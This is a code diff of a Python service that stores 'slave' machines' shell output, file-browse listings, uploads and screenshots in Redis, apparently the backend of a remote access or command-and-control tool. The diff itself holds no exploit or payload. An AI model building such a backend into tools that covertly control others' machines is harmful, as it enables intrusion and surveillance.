@@ -45,12 +45,23 @@ def del_slave_command_entry_from_redis(mac_address):
     redisutil.delete_key(key)
 
 
-def set_slave_response(slave_text_op_req):
+def set_slave_shell_response(slave_text_op_req):
     key = f"{REDIS_PREFIX_SLAVE_RESPONSE}_{slave_text_op_req.mac}"
     
     resp_json = {"content": slave_text_op_req.content}
 
     redisutil.set_key_val(key,json.dumps(resp_json))
+
+def set_slave_file_browse_response(slave_file_browse_op_req):
+    key = f"{REDIS_PREFIX_SLAVE_RESPONSE}_{slave_file_browse_op_req.mac}"
+    
+    resp_json = {
+        "directories": slave_file_browse_op_req.directories,
+        "files": slave_file_browse_op_req.files
+    }
+
+    redisutil.set_key_val(key,json.dumps(resp_json))
+
 
 def save_slave_file_upload(mac_address, file):
     # Delete slave command entry
@@ -82,14 +93,24 @@ def get_slave_command(http_request_obj, slave_command_obj):
     return fetch_slave_command(slave_command_obj.mac)
 
 # SERVICE ENTRY FUNCTION
-def set_slave_command_output(slave_text_op_req):
+def set_slave_shell_command_output(slave_text_op_req):
     # Delete slave command entry
     del_slave_command_entry_from_redis(slave_text_op_req.mac)
     
 
     # Set Slave Response to REDIS
-    set_slave_response(slave_text_op_req)
+    set_slave_shell_response(slave_text_op_req)
     return {"message":"done"}
+
+# SERVICE ENTRY FUNCTION
+def set_slave_file_browse_command_output(slave_file_browse_op_req):
+    # Delete slave command entry
+    del_slave_command_entry_from_redis(slave_file_browse_op_req.mac)
+
+    # Set Slave Response to REDIS
+    set_slave_file_browse_response(slave_file_browse_op_req)
+    return {"message":"done"}
+
 
 # SERVICE ENTRY FUNCTION
 def save_screenshot_from_slave(mac, file):
